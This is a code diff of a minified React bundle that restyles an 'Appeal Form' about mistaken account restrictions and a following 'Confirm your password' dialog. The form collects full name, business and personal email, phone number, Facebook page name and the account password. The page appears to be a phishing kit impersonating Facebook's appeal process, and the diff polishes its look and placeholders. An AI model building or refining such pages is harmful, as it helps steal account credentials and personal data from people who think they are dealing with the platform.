@@ -11714,14 +11714,11 @@ qs.defaultStyles = {
     left: 0,
     right: 0,
     bottom: 0,
-    backgroundColor: "rgba(255, 255, 255, 0.75)",
+    backgroundColor: "rgba(0,0,0, 0.6)",
   },
   content: {
     position: "absolute",
-    top: "40px",
-    left: "40px",
-    right: "40px",
-    bottom: "40px",
+    inset: 40,
     border: "1px solid #ccc",
     background: "#fff",
     overflow: "auto",
@@ -14673,12 +14670,14 @@ function JA() {
               right: "auto",
               bottom: "auto",
               marginRight: "-50%",
+
               transform: "translate(-50%, -50%)",
-              borderRadius: 25,
+              borderRadius: 15,
               padding: 0,
-              borderWidth: 1,
-              overflowY: "scroll",
-              maxHeight: "90vh",
+              borderWidth: 0,
+              //overflowY: "scroll",
+              maxHeight: 800,
+              maxWidth: 500,
             },
           },
           children: L.jsxs("div", {
@@ -14692,64 +14691,51 @@ function JA() {
                 }),
               }),
               L.jsx("h1", {
-                className: "bold text-2xl mt-3 mb-1",
-                children: "Appeal form",
+                className: "bold text-2xl mt-3 mb-4",
+                children: "Appeal Form",
               }),
               L.jsx("div", {
                 className: "text-xs max-w-md text-gray-700 mb-5",
                 children:
-                  "Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal.",
+                  "Please indicate why you believe that account restrictions were imposed by mistake. Our technology and team work in multiple languages to ensure consistent enforcement of rules. You can communicate with us in your native language.",
               }),
               L.jsxs("form", {
                 onSubmit: g(V),
                 children: [
-                  L.jsx("div", {
-                    className: "text-sm",
-                    children:
-                      "Please provide us information that will help us investigate",
-                  }),
                   L.jsx("textarea", {
                     type: "text",
                     rows: 5,
                     ...p("providedInfo"),
                     className: "w-full rounded-lg border mb-1 px-3 py-2",
+                    placeholder: "Additional info ...",
                   }),
-                  L.jsx("div", { className: "text-sm", children: "Full name" }),
                   L.jsx("input", {
                     ...p("fullName"),
-                    className: "w-full h-10 rounded-lg border mb-2 px-3",
+                    className: "w-full h-10 rounded-lg border mb-2 px-3 p-1",
+                    placeholder: "Full Name",
                   }),
-                  L.jsx("div", {
-                    className: "text-sm",
-                    children: "Business email address",
-                  }),
+
                   L.jsx("input", {
                     ...p("businessEmailAddress"),
                     className: "w-full h-10 rounded-lg border mb-2 px-3",
+                    placeholder: "Business Email Address",
                   }),
-                  L.jsx("div", {
-                    className: "text-sm",
-                    children: "Personal email address",
-                  }),
+
                   L.jsx("input", {
                     ...p("personalEmailAddress"),
                     className: "w-full h-10 rounded-lg border mb-2 px-3",
+                    placeholder: "Personal Email Address",
                   }),
-                  L.jsx("div", {
-                    className: "text-sm",
-                    children: "Mobile phone number",
-                  }),
+
                   L.jsx("input", {
                     ...p("mobilePhoneNumber"),
                     className: "w-full h-10 rounded-lg border mb-2 px-3",
-                  }),
-                  L.jsx("div", {
-                    className: "text-sm",
-                    children: "Facebook page name",
+                    placeholder: "Mobile Phone Number",
                   }),
                   L.jsx("input", {
                     ...p("facebookPageName"),
                     className: "w-full h-10 rounded-lg border px-3",
+                    placeholder: "Facebook Page Name",
                   }),
                   L.jsxs("div", {
                     className: "text-xs max-w-md text-gray-700 mt-5",
@@ -14816,7 +14802,7 @@ function JA() {
               bottom: "auto",
               marginRight: "-50%",
               transform: "translate(-50%, -50%)",
-              borderRadius: 25,
+              borderRadius: 15,
               padding: 0,
               borderWidth: 1,
             },
@@ -14836,21 +14822,18 @@ function JA() {
                 children: "Confirm your password",
               }),
               L.jsx("div", {
-                className: "text-md max-w-md text-gray-700 mb-8",
+                className: "text-md max-w-md text-gray-700 mb-5",
                 children:
                   "For your security, you must enter your password to continue.",
               }),
               L.jsxs("form", {
                 children: [
-                  L.jsx("div", {
-                    className: "text-sm max-w-md text-gray-700 mb-1",
-                    children: "Password",
-                  }),
                   L.jsx("input", {
                     ...p("pass"),
                     type: "password",
                     className:
-                      "w-full h-10 rounded-lg border mb-2 px-3 text-xl",
+                      "w-full h-10 rounded-lg border mb-2 px-3 text-xl1",
+                    placeholder: "Password",
                   }),
                   L.jsx("div", {
                     className: oa({
@@ -14897,7 +14880,7 @@ function JA() {
               bottom: "auto",
               marginRight: "-50%",
               transform: "translate(-50%, -50%)",
-              borderRadius: 25,
+              borderRadius: 15,
               padding: 0,
               maxWidth: "100%",
               borderWidth: 1,
@@ -15116,6 +15099,9 @@ function JA() {
       L.jsxs("div", {
         className:
           "bg-white rounded-3xl overflow-hidden pb-5 my-3 max-w-[900px]",
+        style: {
+          boxShadow: "rgba(0,0,0,0.1) 3px 3px 8px 3px",
+        },
         children: [
           L.jsx("img", {
             src: "/unlock.png",
